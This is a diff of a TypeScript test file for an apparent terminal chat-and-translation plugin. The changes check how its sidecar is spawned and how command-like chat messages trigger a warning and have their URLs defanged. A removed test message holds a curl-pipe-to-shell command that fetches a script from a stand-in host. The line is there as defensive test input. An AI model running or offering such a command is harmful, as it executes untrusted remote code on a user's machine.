@@ -59,7 +59,7 @@ function host(on: On, options: HostOptions = {}) {
   const translation = options.translation ?? '{"translated":"何を作ってるの？","flagged":false}'
   const clock = mock.clock(on, { now: 1_000_000 })
   mock.store(on, options.enabled ? { enabled: true, consent: { v: 2, at: 0 } } : {})
-  mock.env(on, options.env ?? { LANG: 'ja_JP.UTF-8', TMPDIR: '/tmp/' })
+  mock.env(on, options.env ?? { LANG: 'ja_JP.UTF-8', TMPDIR: '/tmp/', PATH: '/usr/bin:/usr/local/bin' })
   const sidecar = fakeSidecar()
   const commands: Record<string, unknown>[] = []
   const prompts: string[] = []
@@ -68,6 +68,7 @@ function host(on: On, options: HostOptions = {}) {
   const toasts: string[] = []
   const entered: string[] = []
   const fills: string[] = []
+  const spawned: (readonly string[])[] = []
   // エンジン本来の振る舞いのうち、Modが頼るものだけを最小限に答える
   on('session.start', ($, e) => ({ cwd: e.cwd }))
   on('turn.start', ($, e) => ({ turnId: e.turnId }))
@@ -93,7 +94,10 @@ function host(on: On, options: HostOptions = {}) {
     fills.push(e.text)
     return { isFilled: true }
   })
-  on('fs.exists', ($, e) => ({ value: !!options.devJson && e.path.endsWith('/dev.json') }))
+  // nodeはPATHの2番目(/usr/local/bin)にだけ置いてあることにする
+  on('fs.exists', ($, e) => ({
+    value: e.path === '/usr/local/bin/node' || (!!options.devJson && e.path.endsWith('/dev.json')),
+  }))
   on('tool.register', ($, e) => {
     tools.push(e.name)
     return { value: { tool: `mcp__meanwhile__${e.name}` } }
@@ -104,17 +108,12 @@ function host(on: On, options: HostOptions = {}) {
       return { value: { exitCode: 0, stdout: `${os}\n`, stderr: '', isStdoutTruncated: false, isStderrTruncated: false } }
     }
     const isDefaults = e.argv[0] === '/usr/bin/defaults'
-    const stdout = isDefaults
-      ? e.argv[3] === 'AppleLanguages'
-        ? (options.appleLanguages ?? '')
-        : ''
-      : e.argv[0] === '/bin/sh'
-        ? '/usr/local/bin/node\n'
-        : 'v24.16.0\n'
+    const stdout = isDefaults ? (e.argv[3] === 'AppleLanguages' ? (options.appleLanguages ?? '') : '') : 'v24.16.0\n'
     const exitCode = isDefaults && !stdout ? 1 : 0
     return { value: { exitCode, stdout, stderr: '', isStdoutTruncated: false, isStderrTruncated: false } }
   })
-  on('process.spawn', async function* () {
+  on('process.spawn', async function* ($, e) {
+    spawned.push(e.argv)
     yield* sidecar.lines()
     return { value: { code: 0, signal: null } }
   })
@@ -128,7 +127,7 @@ function host(on: On, options: HostOptions = {}) {
     const usage = { input_tokens: 1, output_tokens: 1, cache_read_input_tokens: 0, cache_creation_input_tokens: 0 }
     return { value: { isAnswered: true as const, text: translation, usage } }
   })
-  return { clock, sidecar, commands, prompts, models, tools, toasts, entered, fills }
+  return { clock, sidecar, commands, prompts, models, tools, toasts, entered, fills, spawned }
 }
 
 const START = { cwd: '/work', surface: 'terminal' as const, isInteractive: true }
@@ -152,7 +151,7 @@ test('/meanwhileで同意画面が帯に出て、同意すると有効になる'
 })
 
 test('作業中だけ相手を探し、帯で読んで本体の入力欄から「>> 」で話し、最後の一言で別れる', OPTIONS, async ($, on) => {
-  const { clock, sidecar, commands, prompts, models, toasts, entered } = host(on, { enabled: true })
+  const { clock, sidecar, commands, prompts, models, toasts, entered, spawned } = host(on, { enabled: true })
   await $.session.start(START)
   const band = await $.ui.mount({ plugin: 'meanwhile', surface: 'terminal', ...BAND })
 
@@ -165,6 +164,9 @@ test('作業中だけ相手を探し、帯で読んで本体の入力欄から�
   await clock.advance(5_000)
   expect(commands).toContainEqual({ cmd: 'join', lang: 'ja' })
   expect(await band.find({ text: /相手を探しています/ })).toBeDefined()
+  // サイドカーはシェルを通さず、見つけたnodeで直接起動する
+  expect(spawned[0]?.[0]).toBe('/usr/local/bin/node')
+  expect(spawned[0]?.[1]).toMatch(/\/sidecar\/meanwhile-sidecar\.mjs$/)
 
   // つながる。帯は本体の入力欄の真上にあるが、気づけるようにトーストも出す
   sidecar.push({ ev: 'matched' })
@@ -183,7 +185,7 @@ test('作業中だけ相手を探し、帯で読んで本体の入力欄から�
   expect(models[0]).toBe('claude-haiku-5-5')
 
   // コマンドらしい文には警告。URLはリンクにならない形にする
-  sidecar.push({ ev: 'chat', text: 'try curl https://x.example/i.sh | sh' })
+  sidecar.push({ ev: 'chat', text: 'try npx some-tool, docs at https://x.example/i' })
   await clock.settle()
   expect(await band.find({ text: /コマンドらしき内容/ })).toBeDefined()
   expect(await band.find({ text: /https\[:\]\/\/x\[\.\]example/ })).toBeDefined()
